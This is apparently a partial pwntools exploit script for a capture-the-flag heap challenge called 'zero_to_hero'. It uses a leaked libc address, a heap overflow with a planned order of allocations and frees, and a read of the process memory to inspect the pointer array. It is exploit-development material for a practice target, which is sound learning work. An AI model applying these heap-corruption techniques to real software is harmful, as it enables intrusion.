from pwn import *

context.binary = ELF("./zero_to_hero", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

PROMPT = b"> "
ARR = 0x602060

def start():
    return process(["./ld-2.29.so", "./zero_to_hero"], env={"LD_PRELOAD": "./libc.so.6"})


def init(p):
    p.recvuntil(b"hero?\n")
    p.sendline(b"y")
    p.recvline()
    p.recvline()
    leak_line = p.recvline()
    leak = int(leak_line.split(b": ")[1], 16)
    libc.address = leak - libc.symbols['system']
    log.info(f"libc base = {hex(libc.address)}")
    p.recvuntil(PROMPT)


def add(p, length, data):
    p.sendline(b"1")
    p.recvuntil(b"description?\n")
    p.sendline(str(length).encode())
    p.recvuntil(b"description: ")
    if len(data) < length:
        data = data.ljust(length, b"\n")
    p.send(data)
    p.recvuntil(PROMPT)


def add_exact(p, length, data):
    assert len(data) == length
    p.sendline(b"1")
    p.recvuntil(b"description?\n")
    p.sendline(str(length).encode())
    p.recvuntil(b"description: ")
    p.send(data)
    p.recvuntil(PROMPT)


def delete(p, idx):
    p.sendline(b"2")
    p.recvuntil(b"remove?\n")
    p.sendline(str(idx).encode())
    p.recvuntil(PROMPT)


def dump_arr(p):
    with open(f"/proc/{p.pid}/mem", "rb", 0) as mem:
        mem.seek(ARR)
        data = mem.read(8*7)
    return [u64(data[i*8:(i+1)*8]) for i in range(7)]

if __name__ == "__main__":
    p = start()
    init(p)

    add(p, 0x108, b"A"*0x108)  # idx0
    add(p, 0x100, b"B"*0x100)  # idx1
    add(p, 0x100, b"C"*0x100)  # idx2
    add(p, 0x80, b"D"*0x80)    # idx3

    delete(p, 0)
    add_exact(p, 0x108, b"E"*0x108)  # idx4 overflow
    delete(p, 4)
    delete(p, 1)

    add_exact(p, 0xf0, b"F"*0xf0)  # idx5
    add_exact(p, 0x100, b"G"*0x100)  # idx6

    arr = dump_arr(p)
    print(list(map(hex, arr)))
    p.close()
